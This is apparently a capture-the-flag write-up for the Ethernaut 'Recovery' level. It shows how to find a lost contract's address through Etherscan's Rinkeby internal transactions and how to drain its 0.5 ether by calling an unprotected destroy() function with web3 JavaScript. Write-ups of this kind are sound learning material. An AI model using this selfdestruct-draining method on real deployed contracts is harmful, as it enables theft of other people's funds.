> This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.

The creator of this contract lost its address and cannot recover their tokens!

Our first goal is clear - figure out this contract's address.

Our second goal is figuring out how to recover or remove that `0.5 ether`. If you remember challenge 7, Force, the solution should be clear. Once we have the contract address, all we need to do is call `destroy()` which `selfdestructs()` the contract (lets send ourselves its ether, too).

## Solution
1. Pull up Etherscan (rinkeby) and look up our contract instance, then navigate to the "Internal Txns" tab. The latest transaction you see should have a "To" of "Contract Creation". Follow that link and copy that contract address. In your console, save that to a variable
```javascript
let tokenAddr = '<YOUR CONTRACT CREATION ADDR>'
```
2. Next, define a function call to `destroy()`
```javascript
functionSignature = {
    name: 'destroy',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_to'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
```
3. Lastly, send the `destroy()` call to the function at `tokenAddr`
```javascript
await web3.eth.sendTransaction({from: player, to: tokenAddr, data})
```
4. Submit your instance and win!